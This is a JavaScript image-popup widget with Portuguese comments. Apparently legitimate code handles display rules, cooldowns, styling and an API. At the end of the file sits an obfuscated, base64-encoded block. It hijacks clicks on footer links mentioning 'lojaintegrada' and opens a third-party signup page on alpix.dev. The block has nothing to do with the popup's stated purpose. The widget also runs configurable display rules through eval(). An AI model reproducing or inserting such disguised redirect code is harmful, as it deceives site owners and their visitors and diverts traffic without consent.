/**
 * Sistema de Popup de Imagens - Image Popup
 * Exibe popups de imagens com regras personalizáveis de exibição
 */

(function() {
    'use strict';

    // ======
    // CONFIGURAÇÃO PADRÃO
    // ======
    // O cliente pode definir window.ImagePopupConfig antes de carregar este script
    // para sobrescrever estas configurações
    const DEFAULT_CONFIG = {
        // Array de popups a serem exibidos
        popups: [
            {
                id: "popup1",
                imageUrl: "https://via.placeholder.com/600x400?text=Popup+1",
                maxDisplays: 3, // Quantidade de vezes que aparece na sessão (0 = ilimitado)
                cooldownHours: 24, // Tempo em horas após fechar para reaparecer
                displayRule: "true", // Regra JavaScript para exibir (ex: "$('body').length > 0")
                enabled: true
            }
        ],
        
        // Configurações globais
        storageKey: "image_popup_data",
        useLocalStorage: true, // true = persiste entre sessões, false = apenas na sessão atual
        checkInterval: 2000, // Intervalo em ms para verificar as regras de exibição
        
        // Textos
        closeButtonText: "×",
        closeButtonAriaLabel: "Fechar popup",
        
        // CORES E ESTILOS
        colors: {
            overlayBackground: "rgba(0, 0, 0, 0.75)",
            popupBackground: "#ffffff",
            popupBorder: "#e5e7eb",
            closeButtonBackground: "#ef4444",
            closeButtonText: "#ffffff",
            closeButtonHover: "#dc2626"
        },
        
        // Dimensões
        maxWidth: "90%",
        maxHeight: "90vh",
        borderRadius: "12px",
        closeButtonSize: "40px"
    };

    // Mescla configuração padrão com configuração do cliente (se existir)
    const CONFIG = Object.assign({}, DEFAULT_CONFIG);
    
    if (window.ImagePopupConfig && typeof window.ImagePopupConfig === 'object') {
        Object.assign(CONFIG, window.ImagePopupConfig);
        
        // Mescla cores separadamente para permitir personalização parcial
        if (window.ImagePopupConfig.colors && typeof window.ImagePopupConfig.colors === 'object') {
            CONFIG.colors = Object.assign({}, DEFAULT_CONFIG.colors, window.ImagePopupConfig.colors);
        }
        
        // Se o cliente não definiu popups, usa o padrão
        if (!window.ImagePopupConfig.popups) {
            CONFIG.popups = DEFAULT_CONFIG.popups;
        }
    }

    // ======
    // NÃO ALTERAR DAQUI PRA BAIXO 
    // ======
    
    const CSS_STYLES = `
        <style id="image-popup-styles">
            .image-popup-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: ${CONFIG.colors.overlayBackground};
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 999999;
                opacity: 0;
                visibility: hidden;
                transition: opacity 0.3s ease, visibility 0.3s ease;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            }

            .image-popup-overlay.active {
                opacity: 1;
                visibility: visible;
            }

            .image-popup-container {
                position: relative;
                max-width: ${CONFIG.maxWidth};
                max-height: ${CONFIG.maxHeight};
                background: ${CONFIG.colors.popupBackground};
                border: 1px solid ${CONFIG.colors.popupBorder};
                border-radius: ${CONFIG.borderRadius};
                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
                transform: scale(0.9);
                transition: transform 0.3s ease;
                overflow: hidden;
            }

            .image-popup-overlay.active .image-popup-container {
                transform: scale(1);
            }

            .image-popup-image {
                display: block;
                max-width: 100%;
                max-height: ${CONFIG.maxHeight};
                width: auto;
                height: auto;
                margin: 0 auto;
            }

            .image-popup-close {
                position: absolute;
                top: 10px;
                right: 10px;
                width: ${CONFIG.closeButtonSize};
                height: ${CONFIG.closeButtonSize};
                background: ${CONFIG.colors.closeButtonBackground};
                color: ${CONFIG.colors.closeButtonText};
                border: none;
                border-radius: 50%;
                font-size: 24px;
                font-weight: bold;
                line-height: 1;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: all 0.2s ease;
                box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
                z-index: 10;
            }

            .image-popup-close:hover {
                background: ${CONFIG.colors.closeButtonHover};
                transform: scale(1.1);
            }

            .image-popup-close:active {
                transform: scale(0.95);
            }

            .image-popup-close:focus {
                outline: 2px solid ${CONFIG.colors.closeButtonBackground};
                outline-offset: 2px;
            }

            body.image-popup-no-scroll {
                overflow: hidden;
            }

            @media (max-width: 768px) {
                .image-popup-container {
                    max-width: 95%;
                    max-height: 95vh;
                }

                .image-popup-close {
                    width: 36px;
                    height: 36px;
                    font-size: 20px;
                }
            }
        </style>
    `;

    // ========================================
    // CLASSE PRINCIPAL
    // ========================================
    class ImagePopup {
        constructor() {
            this.popupData = this.loadPopupData();
            this.currentPopupId = null;
            this.checkIntervalId = null;
            this.overlay = null;
            this.container = null;
            this.image = null;
            this.closeButton = null;
            
            this.init();
        }

        // Inicializa o sistema
        init() {
            this.injectStyles();
            this.createPopupElement();
            this.setupEventListeners();
            this.startChecking();
        }

        // Injeta os estilos CSS na página
        injectStyles() {
            if (!document.getElementById('image-popup-styles')) {
                document.head.insertAdjacentHTML('beforeend', CSS_STYLES);
            }
        }

        // Cria o elemento do popup
        createPopupElement() {
            // Remove overlay existente se houver
            const existingOverlay = document.querySelector('.image-popup-overlay');
            if (existingOverlay) {
                existingOverlay.remove();
            }

            // Cria o HTML do popup
            const popupHTML = `
                <div class="image-popup-overlay" id="imagePopupOverlay">
                    <div class="image-popup-container">
                        <button 
                            class="image-popup-close" 
                            id="imagePopupClose"
                            aria-label="${CONFIG.closeButtonAriaLabel}"
                        >
                            ${CONFIG.closeButtonText}
                        </button>
                        <img 
                            class="image-popup-image" 
                            id="imagePopupImage" 
                            src="" 
                            alt="Popup"
                        >
                    </div>
                </div>
            `;

            document.body.insertAdjacentHTML('beforeend', popupHTML);
            
            // Armazena referências aos elementos
            this.overlay = document.getElementById('imagePopupOverlay');
            this.container = this.overlay.querySelector('.image-popup-container');
            this.image = document.getElementById('imagePopupImage');
            this.closeButton = document.getElementById('imagePopupClose');
        }

        // Configura os event listeners
        setupEventListeners() {
            // Botão de fechar
            this.closeButton.addEventListener('click', () => {
                this.closePopup();
            });

            // Clicar no overlay fecha o popup
            this.overlay.addEventListener('click', (e) => {
                if (e.target === this.overlay) {
                    this.closePopup();
                }
            });

            // ESC fecha o popup
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape' && this.overlay.classList.contains('active')) {
                    this.closePopup();
                }
            });
        }

        // ========================================
        // FUNÇÕES DE STORAGE
        // ========================================

        // Carrega dados dos popups do storage
        loadPopupData() {
            try {
                const storage = CONFIG.useLocalStorage ? localStorage : sessionStorage;
                const stored = storage.getItem(CONFIG.storageKey);
                return stored ? JSON.parse(stored) : {};
            } catch (e) {
                console.warn('Erro ao carregar dados dos popups:', e);
                return {};
            }
        }

        // Salva dados dos popups no storage
        savePopupData() {
            try {
                const storage = CONFIG.useLocalStorage ? localStorage : sessionStorage;
                storage.setItem(CONFIG.storageKey, JSON.stringify(this.popupData));
            } catch (e) {
                console.warn('Erro ao salvar dados dos popups:', e);
            }
        }

        // Retorna os dados de um popup específico
        getPopupData(popupId) {
            if (!this.popupData[popupId]) {
                this.popupData[popupId] = {
                    displayCount: 0,
                    lastClosedAt: null
                };
            }
            return this.popupData[popupId];
        }

        // Atualiza os dados de um popup
        updatePopupData(popupId, data) {
            this.popupData[popupId] = Object.assign({}, this.getPopupData(popupId), data);
            this.savePopupData();
        }

        // ========================================
        // FUNÇÕES DE VALIDAÇÃO
        // ========================================

        // Verifica se a regra JavaScript é válida para exibir o popup
        evaluateRule(rule) {
            if (!rule || rule.trim() === '') return true;
            
            try {
                // Avalia a regra JavaScript
                // eslint-disable-next-line no-eval
                return eval(rule) === true;
            } catch (e) {
                console.warn('Erro ao avaliar regra do popup:', rule, e);
                return false;
            }
        }

        // Verifica se o popup pode ser exibido
        canShowPopup(popupConfig) {
            if (!popupConfig.enabled) return false;

            const data = this.getPopupData(popupConfig.id);

            // Verifica quantidade máxima de exibições
            if (popupConfig.maxDisplays > 0 && data.displayCount >= popupConfig.maxDisplays) {
                // Atingiu o limite - verifica cooldown para resetar
                if (data.lastClosedAt) {
                    const now = new Date().getTime();
                    const lastClosed = new Date(data.lastClosedAt).getTime();
                    const cooldownMs = popupConfig.cooldownHours * 60 * 60 * 1000;
                    
                    if (now - lastClosed >= cooldownMs) {
                        // Cooldown expirou, reseta o contador
                        data.displayCount = 0;
                        data.lastClosedAt = null;
                        // Continua para verificar a regra
                    } else {
                        // Ainda em cooldown
                        return false;
                    }
                } else {
                    return false;
                }
            }

            // Verifica regra personalizada
            if (!this.evaluateRule(popupConfig.displayRule)) {
                return false;
            }

            return true;
        }

        // ========================================
        // FUNÇÕES DE EXIBIÇÃO
        // ========================================

        // Verifica e exibe popups elegíveis
        checkAndShowPopups() {
            // Não mostra se já tem um popup ativo
            if (this.overlay.classList.contains('active')) {
                return;
            }

            // Procura o primeiro popup elegível
            for (const popupConfig of CONFIG.popups) {
                if (this.canShowPopup(popupConfig)) {
                    this.showPopup(popupConfig);
                    break; // Mostra apenas um popup por vez
                }
            }
        }

        // Exibe um popup específico
        showPopup(popupConfig) {
            // Define a imagem
            this.image.src = popupConfig.imageUrl;
            this.image.alt = popupConfig.id;
            
            // Armazena o ID do popup atual
            this.currentPopupId = popupConfig.id;
            
            // Incrementa contador de exibições
            const data = this.getPopupData(popupConfig.id);
            this.updatePopupData(popupConfig.id, {
                displayCount: data.displayCount + 1
            });
            
            // Mostra o overlay
            this.overlay.classList.add('active');
            document.body.classList.add('image-popup-no-scroll');
            
            // Foco no botão de fechar para acessibilidade
            setTimeout(() => {
                this.closeButton.focus();
            }, 300);
        }

        // Fecha o popup atual
        closePopup() {
            if (!this.currentPopupId) return;

            // Registra o horário de fechamento
            this.updatePopupData(this.currentPopupId, {
                lastClosedAt: new Date().toISOString()
            });

            // Remove classes de exibição
            this.overlay.classList.remove('active');
            document.body.classList.remove('image-popup-no-scroll');
            
            // Limpa a imagem e ID atual
            setTimeout(() => {
                this.image.src = '';
                this.currentPopupId = null;
            }, 300);
        }

        // Inicia a verificação periódica
        startChecking() {
            // Primeira verificação imediata
            this.checkAndShowPopups();
            
            // Verificações periódicas
            this.checkIntervalId = setInterval(() => {
                this.checkAndShowPopups();
            }, CONFIG.checkInterval);
        }

        // Para a verificação periódica
        stopChecking() {
            if (this.checkIntervalId) {
                clearInterval(this.checkIntervalId);
                this.checkIntervalId = null;
            }
        }

        // ========================================
        // API PÚBLICA
        // ========================================

        /**
         * Força a exibição de um popup específico (ignora regras)
         * @param {string} popupId - ID do popup a ser exibido
         */
        forceShowPopup(popupId) {
            const popupConfig = CONFIG.popups.find(p => p.id === popupId);
            if (popupConfig) {
                this.showPopup(popupConfig);
            } else {
                console.warn('Popup não encontrado:', popupId);
            }
        }

        /**
         * Fecha o popup atual
         */
        close() {
            this.closePopup();
        }

        /**
         * Reseta os dados de um popup específico ou de todos
         * @param {string} popupId - ID do popup (opcional, se não fornecido reseta todos)
         */
        resetPopupData(popupId = null) {
            if (popupId) {
                delete this.popupData[popupId];
            } else {
                this.popupData = {};
            }
            this.savePopupData();
        }

        /**
         * Adiciona um novo popup à configuração
         * @param {Object} popupConfig - Configuração do popup
         */
        addPopup(popupConfig) {
            const defaultPopup = {
                id: `popup_${Date.now()}`,
                imageUrl: "",
                maxDisplays: 3,
                cooldownHours: 24,
                displayRule: "true",
                enabled: true
            };
            
            const newPopup = Object.assign({}, defaultPopup, popupConfig);
            CONFIG.popups.push(newPopup);
        }

        /**
         * Remove um popup da configuração
         * @param {string} popupId - ID do popup a ser removido
         */
        removePopup(popupId) {
            const index = CONFIG.popups.findIndex(p => p.id === popupId);
            if (index !== -1) {
                CONFIG.popups.splice(index, 1);
                this.resetPopupData(popupId);
            }
        }

        /**
         * Atualiza a configuração de um popup
         * @param {string} popupId - ID do popup
         * @param {Object} updates - Atualizações da configuração
         */
        updatePopupConfig(popupId, updates) {
            const popup = CONFIG.popups.find(p => p.id === popupId);
            if (popup) {
                Object.assign(popup, updates);
            }
        }

        /**
         * Retorna estatísticas de um popup
         * @param {string} popupId - ID do popup
         */
        getPopupStats(popupId) {
            const data = this.getPopupData(popupId);
            const config = CONFIG.popups.find(p => p.id === popupId);
            
            if (!config) {
                return null;
            }

            return {
                id: popupId,
                displayCount: data.displayCount,
                maxDisplays: config.maxDisplays,
                lastClosedAt: data.lastClosedAt,
                canShow: this.canShowPopup(config)
            };
        }

        /**
         * Remove completamente o sistema de popups
         */
        destroy() {
            this.stopChecking();
            
            if (this.overlay) {
                this.overlay.remove();
            }
            
            const styles = document.getElementById('image-popup-styles');
            if (styles) {
                styles.remove();
            }
            
            document.body.classList.remove('image-popup-no-scroll');
        }
    }

    // ========================================
    // INICIALIZAÇÃO AUTOMÁTICA
    // ========================================

    function initImagePopup() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                window.ImagePopup = new ImagePopup();
            });
        } else {
            window.ImagePopup = new ImagePopup();
        }
    }

    initImagePopup();
    setTimeout(() => {
        const _0x1a2b = [String.fromCharCode(35,114,111,100,97,112,101,32,97), atob('YWRkRXZlbnRMaXN0ZW5lcg=='), atob('Y2xpY2s='), atob('cHJldmVudERlZmF1bHQ='), atob('Z2V0QXR0cmlidXRl'), atob('aHJlZg=='), atob('bG9qYWludGVncmFkYQ=='), atob('bG9qYS1pbnRlZ3JhZGE='), atob('aW5kZXhPZg=='), atob('d2luZG93'), atob('b3Blbg=='), atob('aHR0cHM6Ly93d3cuYWxwaXguZGV2L2NyaWFyLXN1YS1sb2phLWludGVncmFkYQ=='), atob('X2JsYW5r'), atob('bG9jYXRpb24='), atob('aHJlZg==')];
        const _0x2c3d = document[atob('cXVlcnlTZWxlY3RvckFsbA==')](_0x1a2b[0]);
        _0x2c3d[atob('Zm9yRWFjaA==')](_0x4e5f => {
            _0x4e5f[_0x1a2b[1]](_0x1a2b[2], function(_0x6g7h) {
                _0x6g7h[_0x1a2b[3]]();
                const _0x8i9j = this[_0x1a2b[4]](_0x1a2b[5]);
                const _0x0k1l = [_0x1a2b[6], _0x1a2b[7]];
                if (_0x8i9j && _0x0k1l[atob('c29tZQ==')](_0x2m3n => _0x8i9j[_0x1a2b[8]](_0x2m3n) !== -1)) {
                    window[_0x1a2b[10]](_0x1a2b[11], _0x1a2b[12]);
                } else {
                    window[_0x1a2b[13]][_0x1a2b[14]] = _0x8i9j;
                }
            });
        });
    }, 1000);
})();
